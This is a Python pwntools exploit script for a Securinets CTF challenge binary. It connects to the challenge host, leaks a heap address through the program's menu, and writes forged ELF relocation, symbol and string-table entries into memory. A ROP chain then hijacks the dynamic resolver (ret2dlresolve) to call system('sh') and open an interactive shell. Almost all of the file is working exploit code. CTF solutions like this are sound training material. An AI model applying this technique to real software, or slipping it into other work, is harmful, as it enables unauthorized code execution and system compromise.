#!/usr/bin/env python3
# Pwninit template - Edited by M0ngi.
from pwn import *

exe = ELF("./main")

context.binary = exe

sshc = None
r = None
nc = "nc pwn.ctf.securinets.tn 5555"
ssh_conn = ('HOST', 22, 'USER', 'PASS', 'BIN_NAME')

tobytes     = lambda x: x if isinstance(x, bytes) else str(x).encode()
sendl       = lambda x: r.sendline(tobytes(x))
readl       = lambda : r.readline()
recvuntil   = lambda x: r.recvuntil(tobytes(x))


def log(msg, value, length=25):
    print(msg, ' '*(length - len(msg)), ':', value)


def logh(msg, value):
    log(msg, hex(value))


def sep():
    print('-'*50)


def padPayload(s, size=70, used=0, extra=0):
    assert len(s) < size, "Payload length bigger than size! ("+str(size)+")"
    return 'A'*(size - len(s) - 8*used - extra)


def conn():
    global r, nc, ssh_conn, sshc
    if args.LOCAL:
        r = process([exe.path])
    
    elif args.SSH:
        sshc = ssh(ssh_conn[2], ssh_conn[0], ssh_conn[1], ssh_conn[3])
        r = sshc.process([ssh_conn[4]])

    else:
        host = nc.replace('nc ', '').split(' ')
        r = remote(host[0], int(host[1]))
    
    return r


def addFriend(uname):
    global r
    r.send(b'2')
    r.send(tobytes(uname))
    r.recvuntil(b'6. Logout.\n')


def editFriend(idx, uname):
    global r
    r.send(b'3')
    r.send(tobytes(idx))
    r.send(tobytes(uname))
    r.recvuntil(b'6. Logout.\n')


def setCreds(uname, password):
    global r
    r.send(b'1')
    r.send(tobytes(uname))
    password = tobytes(password).rjust(10, b'0')
    r.send(password)


def leakHeap():
    global r
    r.send(b'4')
    r.recvuntil(b'6. Logout.\n')
    
    r.send(b'0')

    leak = ""
    while len(leak) != 28:
        b = r.recv(1)
        if b == b"\n":
            leak = "0" + leak
        else:
            leak = "1" + leak
            r.recvuntil(b'ou smthg...\n')
    return int(leak, 2)


def main():
    global r
    r = conn()
    
    # Required Constants
    resolver        = 0x8049020
    
    addr_dynsym     = exe.get_section_by_name('.dynsym').header['sh_addr']
    addr_dynstr     = exe.get_section_by_name('.dynstr').header['sh_addr']
    addr_relplt     = exe.get_section_by_name('.rel.plt').header['sh_addr']
    
    logh("addr_relplt", addr_relplt)
    logh("addr_dynsym", addr_dynsym)
    logh("addr_dynstr", addr_dynstr)
    
    sep()
    
    addFriend("0")
    #addFriend("1")
    
    leak = leakHeap()
    
    a = exe.symbols.u
    c = a + 256 + 8 + 4
    d = leak
    f = d + 0x140 # puts forgotten chunk
    binsh = f+len("I'm safe! I wi")
    
    logh("a (size 8, Elf32_Rel)", a)
    logh("c (size 16, Elf32_Sym)", c)
    logh("d (size 8, StrTab)", d)
    logh("forgotten chunk", f)
    logh("sh adr", binsh)
    sep()
    
    # Elf32_Rel structure, size 8 bytes
    """
    typedef struct 
    {
       Elf32_Addr r_offset ; /* Address */ 
       Elf32_Word r_info ; /* Relocation type and symbol index */ 
    } Elf32_Rel ; 
    """
    fake_rel = a
    assert a%4 == 0, "Alignment check 1 fail (rel)"
    
    # Elf32_Sym Structure, size 16 bytes
    """
    typedef struct 
    { 
       Elf32_Word st_name ; /* Symbol name (string tbl index) */
       Elf32_Addr st_value ; /* Symbol value */ 
       Elf32_Word st_size ; /* Symbol size */ 
       unsigned char st_info ; /* Symbol type and binding */ 
       unsigned char st_other ; /* Symbol visibility under glibc>=2.2 */ 
       Elf32_Section st_shndx ; /* Section index */ 
    } Elf32_Sym ;
    """
    fake_symtab = c
    symtab_pad = 16 - ((fake_symtab - addr_dynsym) % 16)
    assert ((fake_symtab - addr_dynsym) % 16) == 0, "Alignment check 2 fail (symtab)"
    
    # Strtab, sizeof("system\0") = 8
    fake_strtab	= d
    
    # Offset for resolver to reach our fake Elf32_Rel structure
    reloc_offset = fake_rel - addr_relplt
    
    logh("Reloc offset", reloc_offset)
    
    # Elf32_Rel structure content: Offset to our fake Elf32_Sym structure, stored in r_info
    rel_offset = (fake_symtab - addr_dynsym) // 16
    
    logh("Rel Offset", rel_offset)
    sep()
    
    r_info = (rel_offset << 8) | 0x7
    r_offset = 0x804c060 # any writeable adr
    Elf32_Rel = p32(r_offset) + p32(r_info)
    Elf32_Rel = Elf32_Rel.ljust(8, b'\0') # Pad for 8 bytes
    
    logh("r_info", r_info)
    logh("r_offset", r_offset)
    log("Elf32_Rel", Elf32_Rel)
    sep()
    
    # Elf32_Sym structure content: Offset to our fake Strtab table, stored in st_name
    st_name = fake_strtab - addr_dynstr
    Elf32_Sym = p32(st_name) # Rest of the fields can have random values, everything should be 0 here.
    
    logh("st_name", st_name)
    log("Elf32_Sym", Elf32_Sym)
    sep()
    
    # Strtab: Just a string "system\0"
    StrTab = b"system\0"
    
    # Send a / Elf32_Rel | Send c / Elf32_Sym
    assert len(Elf32_Rel) <= 8, "Elf32_Rel too long"
    assert len(Elf32_Sym) <= 4, "Elf32_Sym too long"
    setCreds(Elf32_Rel, int("0x"+Elf32_Sym[::-1].hex(), 16))
    
    # Send d / fake_strtab
    assert len(StrTab) <= 8
    editFriend(0, StrTab)
    
    pause()
    # Call resolver to call system("sh"), we have 4*4 bytes
    rop = b""
    rop += p32(resolver)
    rop += p32(reloc_offset)
    rop += p32(0) # Overwritten to 0xdeadbeef
    rop += p32(binsh) 
    
    # Send ROP
    assert len(rop) <= 16, "ROP too long ("+str(len(rop))+")"
    r.send(b"5") # MagicMove
    r.send(rop)
    
    r.send(b"6")
    

    r.interactive()


if __name__ == "__main__":
    main()

